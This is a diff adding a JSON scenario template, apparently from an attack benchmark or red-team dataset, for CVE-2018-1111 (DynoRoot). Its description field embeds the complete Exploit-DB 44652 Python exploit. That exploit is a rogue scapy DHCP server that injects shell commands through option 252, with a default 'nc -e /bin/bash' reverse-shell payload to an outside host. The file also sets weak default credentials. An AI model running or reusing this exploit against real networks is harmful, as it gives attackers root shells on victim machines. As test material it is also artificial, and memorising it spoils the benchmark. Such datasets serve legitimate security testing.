@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44652",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: DynoRoot DHCP Client - Command Injection (CVE-2018-1111)\n\nExploit source code (44652.py):\n```\n# Exploit Title: DynoRoot DHCP - Client Command Injection\n# Date: 2018-05-18\n# Exploit Author: Kevin Kirsche\n# Exploit Repository: https://github.com/kkirsche/CVE-2018-1111\n# Exploit Discoverer: Felix Wilhelm\n# Vendor Homepage: https://www.redhat.com/\n# Version: RHEL 6.x / 7.x and CentOS 6.x/7.x\n# Tested on: CentOS Linux release 7.4.1708 (Core)  / NetworkManager 1.8.0-11.el7_4\n# CVE : CVE-2018-1111\n\n#!/usr/bin/env python\n\nfrom argparse import ArgumentParser\nfrom scapy.all import BOOTP_am, DHCP\nfrom scapy.base_classes import Net\n\n\nclass DynoRoot(BOOTP_am):\n    function_name = \"dhcpd\"\n\n    def make_reply(self, req):\n        resp = BOOTP_am.make_reply(self, req)\n        if DHCP in req:\n            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))\n                            for op in req[DHCP].options\n                            if isinstance(op, tuple) and op[0] == \"message-type\"]\n            dhcp_options += [(\"server_id\", self.gw),\n                             (\"domain\", self.domain),\n                             (\"router\", self.gw),\n                             (\"name_server\", self.gw),\n                             (\"broadcast_address\", self.broadcast),\n                             (\"subnet_mask\", self.netmask),\n                             (\"renewal_time\", self.renewal_time),\n                             (\"lease_time\", self.lease_time),\n                             (252, \"x'&{payload} #\".format(payload=self.payload)),\n                             \"end\"\n                             ]\n            resp /= DHCP(options=dhcp_options)\n        return resp\n\n\nif __name__ == '__main__':\n    parser = ArgumentParser(description='CVE-2018-1111 DynoRoot exploit')\n\n    parser.add_argument('-i', '--interface', default='eth0', type=str,\n                        dest='interface',\n                        help='The interface to listen for DHCP requests on (default: eth0)')\n    parser.add_argument('-s', '--subnet', default='192.168.41.0/24', type=str,\n                        dest='subnet', help='The network to assign via DHCP (default: 192.168.41.0/24)')\n    parser.add_argument('-g', '--gateway', default='192.168.41.254', type=str,\n                        dest='gateway', help='The network gateway to respond with (default: 192.168.41.254)')\n    parser.add_argument('-d', '--domain', default='victim.net', type=str,\n                        dest='domain', help='Domain to assign (default: victim.net)')\n    parser.add_argument('-p', '--payload', default='nc -e /bin/bash 192.168.41.2 1337', type=str,\n                        dest='payload', help='The payload / command to inject (default: nc -e /bin/bash 192.168.41.2 1337)')\n\n    args = parser.parse_args()\n    server = DynoRoot(iface=args.interface, domain=args.domain,\n                      pool=Net(args.subnet),\n                      network=args.subnet,\n                      gw=args.gateway,\n                      renewal_time=600, lease_time=3600)\n    server.payload = args.payload\n\n    server()\n```",
+  "cve": "CVE-2018-1111",
+  "exploitdb_id": "44652",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44652",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
